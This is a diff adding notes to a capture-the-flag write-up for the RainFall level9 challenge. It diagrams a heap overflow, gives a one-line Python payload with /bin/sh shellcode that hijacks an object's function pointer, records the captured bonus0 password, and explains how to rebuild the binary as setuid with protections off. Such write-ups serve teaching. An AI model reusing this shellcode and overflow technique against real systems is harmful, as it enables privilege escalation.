@@ -16,3 +16,70 @@ $ cat /home/user/bonus0/.pass
 f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 $ 
 level9@RainFall:/tmp$ 
+
+
+# ------------------------------------------------------------------------
+# Obtain the next password
+# ------------------------------------------------------------------------
+
+# Heap state:
+
+a = heap address 0x0804a008
+b = heap address 0x0804a078
+
+( 112 bytes         )( 112 bytes         )
+[ a                 ][ b                 ]
+
+(func)(anno...      )(func)(anno...      )
+(4   )(108          )(4   )(108          )
+[ a                 ][ b                 ]
+
+     addr1             addr2
+[(4)(4)(104)        ][(4)                ]
+
+# We input argv[1], which will be memcpy()'d into a->annotation.
+
+# We will format our payload:
+	- (4 bytes)    addr1 = 0x0804a010 (start of shellcode)
+	- (104 bytes)  shellcode + NOP
+	- (4 bytes)    addr2 = 0x0804a00c (value of addr1)
+
+# Later, b->func (addr2) will contain the address to addr1, and when we call function at [addr1], the shellcode is executed.
+
+# Run the program
+~/level9 `python -c "sh='\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80'; print('\x08\x04\xa0\x10'[::-1] + sh + '\x90' * (112-4-4-len(sh)) + '\x08\x04\xa0\x0c'[::-1])"`
+
+	whoami
+	cat /home/user/bonus0/.pass
+
+# Now we can log in as user bonus0
+su bonus0
+# password: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+
+
+
+# ------------------------------------------------------------------------
+# Recreate the exploitable program
+# ------------------------------------------------------------------------
+
+# As user bonus0:
+
+    # Compile the program in /tmp
+    g++ source9.cpp -fno-stack-protector -z execstack -o ft_level9
+
+    # Edit suid
+    chmod u+s ft_level9
+
+    # Move the program to home directory
+    chmod +wx ~; mv ft_level9 ~
+
+# As user level9:
+
+	# a = heap address 0x0804b008
+	# b = heap address 0x0804b078
+
+	# Run the program
+	/home/user/bonus0/ft_level9 `python -c "sh='\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80'; print('\x08\x04\xb0\x10'[::-1] + sh + '\x90' * (112-4-4-len(sh)) + '\x08\x04\xb0\x0c'[::-1])"`
+		whoami
+		cat /home/user/level9/.pass
+
